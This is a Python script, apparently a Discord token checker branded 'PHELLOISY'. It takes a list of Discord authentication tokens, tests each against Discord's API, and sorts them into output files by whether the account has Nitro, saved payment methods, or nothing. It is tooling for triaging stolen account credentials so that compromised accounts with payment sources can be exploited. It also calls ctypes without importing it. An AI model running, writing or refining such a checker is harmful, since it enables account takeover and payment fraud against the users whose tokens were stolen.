import os
import requests
import time

# ANSI escape codes for colors
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREY = '\033[90m'
RESET = '\033[0m'

def banner_print():
        print(RED + """
██████╗ ██╗  ██╗███████╗██╗     ██╗      ██████╗ ██╗███████╗██╗   ██╗        
██╔══██╗██║  ██║██╔════╝██║     ██║     ██╔═══██╗██║██╔════╝╚██╗ ██╔╝
██████╔╝███████║█████╗  ██║     ██║     ██║   ██║██║███████╗ ╚████╔╝ 
██╔═══╝ ██╔══██║██╔══╝  ██║     ██║     ██║   ██║██║╚════██║  ╚██╔╝  
██║     ██║  ██║███████╗███████╗███████╗╚██████╔╝██║███████║   ██║       GITHUB.COM/KARMA-BOI
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝       CREATED BY KARMA                                              
    """ + GREY)

def check_token(token):
    headers = {'Authorization': token}
    response_user = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    response_payment = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers)
    
    if response_user.status_code == 200:
        data_user = response_user.json()
        if 'premium_type' in data_user and data_user['premium_type'] == 2:
            return GREEN + "[+] NITRO TOKEN: " + RESET + token
        elif response_payment.status_code == 200 and response_payment.json():
            return YELLOW + "[+] PAYMENT METHOD TOKEN: " + RESET + token
        else:
            return RED + "[+] EMPTY TOKEN: " + RESET + token
    else:
        return GREY + "[-] INVALID TOKEN: " + RESET + token

def delete_duplicate_starting_tokens(tokens):
    """Delete tokens that start with the same string of characters."""
    tokens_set = set()
    duplicate_tokens = []
    for token in tokens:
        start = token.split('.')[0]
        if start not in tokens_set:
            tokens_set.add(start)
        else:
            duplicate_tokens.append(token)
    return [token for token in tokens if token not in duplicate_tokens], duplicate_tokens

def main():
    ctypes.windll.kernel32.SetConsoleTitleW("CREATED BY KARMA-BOI | PHELLOISY")
    os.system('cls')
    banner_print()

    input("[>] PRESS ENTER TO START CHECKING")
    

    # Create a directory to store output files
    output_directory_working = "OUTPUT\\WORKING"
    output_directory_dead = "OUTPUT\\DEAD"
    input_directory = "INPUT"

    if not os.path.exists(output_directory_working):
        os.makedirs(output_directory_working)
        os.system('cls')
        banner_print()
        print("[>] OUTPUT DIRECTORY NON EXISTENT, CREATING ONE")
        time.sleep(2)
        os.system('cls')
        banner_print()
    if not os.path.exists(output_directory_dead):
        os.makedirs(output_directory_dead)
        os.system('cls')
        banner_print()
        print("[>] OUTPUT DIRECTORY NON EXISTENT, CREATING ONE")
        time.sleep(2)
        os.system('cls')
        banner_print()
        

    # Clear the content of the output files
    open(os.path.join(output_directory_working, "NITRO.txt"), "w").close()
    open(os.path.join(output_directory_working, "PAYMENT METHOD.txt"), "w").close()
    open(os.path.join(output_directory_working, "EMPTY.txt"), "w").close()
    open(os.path.join(output_directory_dead, "INVALID.txt"), "w").close()
    open(os.path.join(output_directory_dead, "DUPLICATE.txt"), "w").close()


    # Read tokens from the input directory
    
    tokens_file = os.path.join(input_directory, "TOKENS.txt")
    if not os.path.exists(tokens_file):
        os.system('cls')
        banner_print()
        print("[>] INPUT DIRECTORY DOES NOT CONTAIN 'TOKENS.txt'")
        time.sleep(2)
        return

    tokens = []
    with open(tokens_file, 'r') as file:
        for line in file:
            tokens.append(line.strip())

    tokens, duplicate_tokens = delete_duplicate_starting_tokens(tokens)

    print(GREY + "[>] STARTING CHECKING PROCCESS")
    time.sleep(2)
    os.system('cls')
    banner_print()
    for token in tokens:
        result = check_token(token)
        if "[+] NITRO TOKEN: " in result:
            with open(os.path.join(output_directory_working, "NITRO.txt"), "a") as f:
                f.write(token + "\n")
        elif "[+] PAYMENT METHOD TOKEN: " in result:
            with open(os.path.join(output_directory_working, "PAYMENT METHOD.txt"), "a") as f:
                f.write(token + "\n")
        elif "[+] EMPTY TOKEN: " in result:
            with open(os.path.join(output_directory_working, "EMPTY.txt"), "a") as f:
                f.write(token + "\n")
        elif "[-] INVALID TOKEN: " in result:
            with open(os.path.join(output_directory_dead, "INVALID.txt"), "a") as f:
                f.write(token + "\n")
        print(result)

    with open(os.path.join(output_directory_dead, "DUPLICATE.txt"), "a") as f:
        for token in duplicate_tokens:
            f.write(token + "\n")

        os.system('cls')
        banner_print()
        print(GREY + f"[>] DELETED {len(duplicate_tokens)} DUBLICATE TOKENS")
        time.sleep(2)
        os.system('cls')
        banner_print()
        print(GREY + "[>] PRESS ENTER TO CLOSE THE PROGRAM")
        time.sleep(2)

if __name__ == "__main__":
    main()


